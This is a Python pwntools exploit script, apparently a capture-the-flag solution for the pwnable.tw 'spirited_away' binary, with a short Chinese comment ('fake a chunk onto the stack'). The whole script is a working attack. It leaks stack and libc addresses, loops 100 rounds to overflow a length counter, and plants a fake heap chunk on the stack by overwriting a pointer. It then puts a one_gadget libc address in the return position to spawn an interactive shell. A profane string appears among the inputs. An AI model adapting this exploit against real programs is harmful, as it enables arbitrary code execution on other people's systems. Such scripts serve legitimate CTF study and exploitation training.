'''
libc.so.27
伪造一个chunk到栈上
'''
from pwn import *
from time import *
context.log_level='debug'
#p=remote('chall.pwnable.tw',10204)
p=process('./spirited_away')
raw_input()
def oneround(name,age,reason,comment,flag='y\x00'):
    p.recvuntil('name: ')
    sleep(0.01)
    p.send(name)
    p.recvuntil('age: ')
    sleep(0.01)
    p.send(age)
    p.recvuntil('movie? ')
    p.send(reason)
    p.recvuntil('comment: ')
    p.send(comment)
    p.recvuntil('<y/n>: ')
    p.send(flag)

#read ebp
reason='d'*79
p.recvuntil('name: ')
p.sendline('a')
p.recvuntil('age: ')
p.sendline('10')
p.recvuntil('movie? ')
p.sendline(reason)
p.recvuntil('comment: ')
p.sendline('b')
p.recvuntil('Reason:')
p.recvuntil('\n')
ebp_addr=u32(p.recvn(4))-0x20
libc_base=u32(p.recvuntil('\n')[-5:-1])-0x1d8d80
print('ebp_addr=>0x%x'%ebp_addr)
print('lic_base=>0x%x'%libc_base)
p.recvuntil('<y/n>: ')
p.sendline('y')
#oneround('a','10','a','b')
for i in range(100):
    sleep(0.01)
    oneround('a\x00','10\x00','a\x00','b\x00')

#next round can read 110bytes to comment
#overflow name, a fake chunk in the stack
#comment to name,84bytes
p.recvuntil('name: ')
p.send('name\x00')
p.recvuntil('movie? ')
reason=p32(0)+p32(0x41)
reason+='a'*56
reason+=p32(0)+p32(0x11)
p.send(reason)
p.recvuntil('comment: ')
comment='b'*84
#name
fake_chunk_ptr=ebp_addr-0x54+4+8
comment+=p32(fake_chunk_ptr)
p.send(comment)
p.recvuntil('<y/n>: ')
p.sendline('y')
# recveive a fake chunk offset2ebp -72
p.recvuntil('name:')
elf=ELF('/lib/i386-linux-gnu/libc.so.6')
one_gadget=0x3d0d3+libc_base
payload='a'*72+p32(0xffffffff)+p32(one_gadget)
p.send(payload)
p.recvuntil('movie? ')
p.send('fuckyou')
p.recvuntil('comment: ')
p.send('heihei')
p.recvuntil('<y/n>: ')
p.sendline('n')
p.interactive()
